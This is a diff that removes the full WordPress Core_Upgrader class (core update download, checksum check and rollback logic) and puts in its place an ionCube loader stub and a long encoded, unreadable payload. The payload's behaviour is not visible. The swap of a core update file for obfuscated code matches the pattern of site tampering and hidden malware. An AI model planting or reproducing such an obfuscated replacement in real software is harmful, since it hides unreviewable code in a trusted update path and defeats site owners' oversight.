@@ -1,362 +1,197 @@
-<?php
-/**
- * Upgrade API: Core_Upgrader class
- *
- * @package WordPress
- * @subpackage Upgrader
- * @since 4.6.0
- */
-
-/**
- * Core class used for updating core.
- *
- * It allows for WordPress to upgrade itself in combination with
- * the wp-admin/includes/update-core.php file.
- *
- * @since 2.8.0
- * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader.php.
- *
- * @see WP_Upgrader
- */
-class Core_Upgrader extends WP_Upgrader {
-
-	/**
-	 * Initialize the upgrade strings.
-	 *
-	 * @since 2.8.0
-	 */
-	public function upgrade_strings() {
-		$this->strings['up_to_date'] = __('WordPress is at the latest version.');
-		$this->strings['locked'] = __('Another update is currently in progress.');
-		$this->strings['no_package'] = __('Update package not available.');
-		/* translators: %s: package URL */
-		$this->strings['downloading_package'] = sprintf( __( 'Downloading update from %s&#8230;' ), '<span class="code">%s</span>' );
-		$this->strings['unpack_package'] = __('Unpacking the update&#8230;');
-		$this->strings['copy_failed'] = __('Could not copy files.');
-		$this->strings['copy_failed_space'] = __('Could not copy files. You may have run out of disk space.' );
-		$this->strings['start_rollback'] = __( 'Attempting to roll back to previous version.' );
-		$this->strings['rollback_was_required'] = __( 'Due to an error during updating, WordPress has rolled back to your previous version.' );
-	}
-
-	/**
-	 * Upgrade WordPress core.
-	 *
-	 * @since 2.8.0
-	 *
-	 * @global WP_Filesystem_Base $wp_filesystem Subclass
-	 * @global callable           $_wp_filesystem_direct_method
-	 *
-	 * @param object $current Response object for whether WordPress is current.
-	 * @param array  $args {
-	 *        Optional. Arguments for upgrading WordPress core. Default empty array.
-	 *
-	 *        @type bool $pre_check_md5    Whether to check the file checksums before
-	 *                                     attempting the upgrade. Default true.
-	 *        @type bool $attempt_rollback Whether to attempt to rollback the chances if
-	 *                                     there is a problem. Default false.
-	 *        @type bool $do_rollback      Whether to perform this "upgrade" as a rollback.
-	 *                                     Default false.
-	 * }
-	 * @return null|false|WP_Error False or WP_Error on failure, null on success.
-	 */
-	public function upgrade( $current, $args = array() ) {
-		global $wp_filesystem;
-
-		include( ABSPATH . WPINC . '/version.php' ); // $wp_version;
-
-		$start_time = time();
-
-		$defaults = array(
-			'pre_check_md5'    => true,
-			'attempt_rollback' => false,
-			'do_rollback'      => false,
-			'allow_relaxed_file_ownership' => false,
-		);
-		$parsed_args = wp_parse_args( $args, $defaults );
-
-		$this->init();
-		$this->upgrade_strings();
-
-		// Is an update available?
-		if ( !isset( $current->response ) || $current->response == 'latest' )
-			return new WP_Error('up_to_date', $this->strings['up_to_date']);
-
-		$res = $this->fs_connect( array( ABSPATH, WP_CONTENT_DIR ), $parsed_args['allow_relaxed_file_ownership'] );
-		if ( ! $res || is_wp_error( $res ) ) {
-			return $res;
-		}
-
-		$wp_dir = trailingslashit($wp_filesystem->abspath());
-
-		$partial = true;
-		if ( $parsed_args['do_rollback'] )
-			$partial = false;
-		elseif ( $parsed_args['pre_check_md5'] && ! $this->check_files() )
-			$partial = false;
-
-		/*
-		 * If partial update is returned from the API, use that, unless we're doing
-		 * a reinstallation. If we cross the new_bundled version number, then use
-		 * the new_bundled zip. Don't though if the constant is set to skip bundled items.
-		 * If the API returns a no_content zip, go with it. Finally, default to the full zip.
-		 */
-		if ( $parsed_args['do_rollback'] && $current->packages->rollback )
-			$to_download = 'rollback';
-		elseif ( $current->packages->partial && 'reinstall' != $current->response && $wp_version == $current->partial_version && $partial )
-			$to_download = 'partial';
-		elseif ( $current->packages->new_bundled && version_compare( $wp_version, $current->new_bundled, '<' )
-			&& ( ! defined( 'CORE_UPGRADE_SKIP_NEW_BUNDLED' ) || ! CORE_UPGRADE_SKIP_NEW_BUNDLED ) )
-			$to_download = 'new_bundled';
-		elseif ( $current->packages->no_content )
-			$to_download = 'no_content';
-		else
-			$to_download = 'full';
-
-		// Lock to prevent multiple Core Updates occurring
-		$lock = WP_Upgrader::create_lock( 'core_updater', 15 * MINUTE_IN_SECONDS );
-		if ( ! $lock ) {
-			return new WP_Error( 'locked', $this->strings['locked'] );
-		}
-
-		$download = $this->download_package( $current->packages->$to_download );
-		if ( is_wp_error( $download ) ) {
-			WP_Upgrader::release_lock( 'core_updater' );
-			return $download;
-		}
-
-		$working_dir = $this->unpack_package( $download );
-		if ( is_wp_error( $working_dir ) ) {
-			WP_Upgrader::release_lock( 'core_updater' );
-			return $working_dir;
-		}
-
-		// Copy update-core.php from the new version into place.
-		if ( !$wp_filesystem->copy($working_dir . '/wordpress/wp-admin/includes/update-core.php', $wp_dir . 'wp-admin/includes/update-core.php', true) ) {
-			$wp_filesystem->delete($working_dir, true);
-			WP_Upgrader::release_lock( 'core_updater' );
-			return new WP_Error( 'copy_failed_for_update_core_file', __( 'The update cannot be installed because we will be unable to copy some files. This is usually due to inconsistent file permissions.' ), 'wp-admin/includes/update-core.php' );
-		}
-		$wp_filesystem->chmod($wp_dir . 'wp-admin/includes/update-core.php', FS_CHMOD_FILE);
-
-		require_once( ABSPATH . 'wp-admin/includes/update-core.php' );
-
-		if ( ! function_exists( 'update_core' ) ) {
-			WP_Upgrader::release_lock( 'core_updater' );
-			return new WP_Error( 'copy_failed_space', $this->strings['copy_failed_space'] );
-		}
-
-		$result = update_core( $working_dir, $wp_dir );
-
-		// In the event of an issue, we may be able to roll back.
-		if ( $parsed_args['attempt_rollback'] && $current->packages->rollback && ! $parsed_args['do_rollback'] ) {
-			$try_rollback = false;
-			if ( is_wp_error( $result ) ) {
-				$error_code = $result->get_error_code();
-				/*
-				 * Not all errors are equal. These codes are critical: copy_failed__copy_dir,
-				 * mkdir_failed__copy_dir, copy_failed__copy_dir_retry, and disk_full.
-				 * do_rollback allows for update_core() to trigger a rollback if needed.
-				 */
-				if ( false !== strpos( $error_code, 'do_rollback' ) )
-					$try_rollback = true;
-				elseif ( false !== strpos( $error_code, '__copy_dir' ) )
-					$try_rollback = true;
-				elseif ( 'disk_full' === $error_code )
-					$try_rollback = true;
-			}
-
-			if ( $try_rollback ) {
-				/** This filter is documented in wp-admin/includes/update-core.php */
-				apply_filters( 'update_feedback', $result );
-
-				/** This filter is documented in wp-admin/includes/update-core.php */
-				apply_filters( 'update_feedback', $this->strings['start_rollback'] );
-
-				$rollback_result = $this->upgrade( $current, array_merge( $parsed_args, array( 'do_rollback' => true ) ) );
-
-				$original_result = $result;
-				$result = new WP_Error( 'rollback_was_required', $this->strings['rollback_was_required'], (object) array( 'update' => $original_result, 'rollback' => $rollback_result ) );
-			}
-		}
-
-		/** This action is documented in wp-admin/includes/class-wp-upgrader.php */
-		do_action( 'upgrader_process_complete', $this, array( 'action' => 'update', 'type' => 'core' ) );
-
-		// Clear the current updates
-		delete_site_transient( 'update_core' );
-
-		if ( ! $parsed_args['do_rollback'] ) {
-			$stats = array(
-				'update_type'      => $current->response,
-				'success'          => true,
-				'fs_method'        => $wp_filesystem->method,
-				'fs_method_forced' => defined( 'FS_METHOD' ) || has_filter( 'filesystem_method' ),
-				'fs_method_direct' => !empty( $GLOBALS['_wp_filesystem_direct_method'] ) ? $GLOBALS['_wp_filesystem_direct_method'] : '',
-				'time_taken'       => time() - $start_time,
-				'reported'         => $wp_version,
-				'attempted'        => $current->version,
-			);
-
-			if ( is_wp_error( $result ) ) {
-				$stats['success'] = false;
-				// Did a rollback occur?
-				if ( ! empty( $try_rollback ) ) {
-					$stats['error_code'] = $original_result->get_error_code();
-					$stats['error_data'] = $original_result->get_error_data();
-					// Was the rollback successful? If not, collect its error too.
-					$stats['rollback'] = ! is_wp_error( $rollback_result );
-					if ( is_wp_error( $rollback_result ) ) {
-						$stats['rollback_code'] = $rollback_result->get_error_code();
-						$stats['rollback_data'] = $rollback_result->get_error_data();
-					}
-				} else {
-					$stats['error_code'] = $result->get_error_code();
-					$stats['error_data'] = $result->get_error_data();
-				}
-			}
-
-			wp_version_check( $stats );
-		}
-
-		WP_Upgrader::release_lock( 'core_updater' );
-
-		return $result;
-	}
-
-	/**
-	 * Determines if this WordPress Core version should update to an offered version or not.
-	 *
-	 * @since 3.7.0
-	 *
-	 * @static
-	 *
-	 * @param string $offered_ver The offered version, of the format x.y.z.
-	 * @return bool True if we should update to the offered version, otherwise false.
-	 */
-	public static function should_update_to_version( $offered_ver ) {
-		include( ABSPATH . WPINC . '/version.php' ); // $wp_version; // x.y.z
-
-		$current_branch = implode( '.', array_slice( preg_split( '/[.-]/', $wp_version  ), 0, 2 ) ); // x.y
-		$new_branch     = implode( '.', array_slice( preg_split( '/[.-]/', $offered_ver ), 0, 2 ) ); // x.y
-		$current_is_development_version = (bool) strpos( $wp_version, '-' );
-
-		// Defaults:
-		$upgrade_dev   = true;
-		$upgrade_minor = true;
-		$upgrade_major = false;
-
-		// WP_AUTO_UPDATE_CORE = true (all), 'minor', false.
-		if ( defined( 'WP_AUTO_UPDATE_CORE' ) ) {
-			if ( false === WP_AUTO_UPDATE_CORE ) {
-				// Defaults to turned off, unless a filter allows it
-				$upgrade_dev = $upgrade_minor = $upgrade_major = false;
-			} elseif ( true === WP_AUTO_UPDATE_CORE ) {
-				// ALL updates for core
-				$upgrade_dev = $upgrade_minor = $upgrade_major = true;
-			} elseif ( 'minor' === WP_AUTO_UPDATE_CORE ) {
-				// Only minor updates for core
-				$upgrade_dev = $upgrade_major = false;
-				$upgrade_minor = true;
-			}
-		}
-
-		// 1: If we're already on that version, not much point in updating?
-		if ( $offered_ver == $wp_version )
-			return false;
-
-		// 2: If we're running a newer version, that's a nope
-		if ( version_compare( $wp_version, $offered_ver, '>' ) )
-			return false;
-
-		$failure_data = get_site_option( 'auto_core_update_failed' );
-		if ( $failure_data ) {
-			// If this was a critical update failure, cannot update.
-			if ( ! empty( $failure_data['critical'] ) )
-				return false;
-
-			// Don't claim we can update on update-core.php if we have a non-critical failure logged.
-			if ( $wp_version == $failure_data['current'] && false !== strpos( $offered_ver, '.1.next.minor' ) )
-				return false;
-
-			// Cannot update if we're retrying the same A to B update that caused a non-critical failure.
-			// Some non-critical failures do allow retries, like download_failed.
-			// 3.7.1 => 3.7.2 resulted in files_not_writable, if we are still on 3.7.1 and still trying to update to 3.7.2.
-			if ( empty( $failure_data['retry'] ) && $wp_version == $failure_data['current'] && $offered_ver == $failure_data['attempted'] )
-				return false;
-		}
-
-		// 3: 3.7-alpha-25000 -> 3.7-alpha-25678 -> 3.7-beta1 -> 3.7-beta2
-		if ( $current_is_development_version ) {
-
-			/**
-			 * Filters whether to enable automatic core updates for development versions.
-			 *
-			 * @since 3.7.0
-			 *
-			 * @param bool $upgrade_dev Whether to enable automatic updates for
-			 *                          development versions.
-			 */
-			if ( ! apply_filters( 'allow_dev_auto_core_updates', $upgrade_dev ) )
-				return false;
-			// Else fall through to minor + major branches below.
-		}
-
-		// 4: Minor In-branch updates (3.7.0 -> 3.7.1 -> 3.7.2 -> 3.7.4)
-		if ( $current_branch == $new_branch ) {
-
-			/**
-			 * Filters whether to enable minor automatic core updates.
-			 *
-			 * @since 3.7.0
-			 *
-			 * @param bool $upgrade_minor Whether to enable minor automatic core updates.
-			 */
-			return apply_filters( 'allow_minor_auto_core_updates', $upgrade_minor );
-		}
-
-		// 5: Major version updates (3.7.0 -> 3.8.0 -> 3.9.1)
-		if ( version_compare( $new_branch, $current_branch, '>' ) ) {
-
-			/**
-			 * Filters whether to enable major automatic core updates.
-			 *
-			 * @since 3.7.0
-			 *
-			 * @param bool $upgrade_major Whether to enable major automatic core updates.
-			 */
-			return apply_filters( 'allow_major_auto_core_updates', $upgrade_major );
-		}
-
-		// If we're not sure, we don't want it
-		return false;
-	}
-
-	/**
-	 * Compare the disk file checksums against the expected checksums.
-	 *
-	 * @since 3.7.0
-	 *
-	 * @global string $wp_version
-	 * @global string $wp_local_package
-	 *
-	 * @return bool True if the checksums match, otherwise false.
-	 */
-	public function check_files() {
-		global $wp_version, $wp_local_package;
-
-		$checksums = get_core_checksums( $wp_version, isset( $wp_local_package ) ? $wp_local_package : 'en_US' );
-
-		if ( ! is_array( $checksums ) )
-			return false;
-
-		foreach ( $checksums as $file => $checksum ) {
-			// Skip files which get updated
-			if ( 'wp-content' == substr( $file, 0, 10 ) )
-				continue;
-			if ( ! file_exists( ABSPATH . $file ) || md5_file( ABSPATH . $file ) !== $checksum )
-				return false;
-		}
-
-		return true;
-	}
-}
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
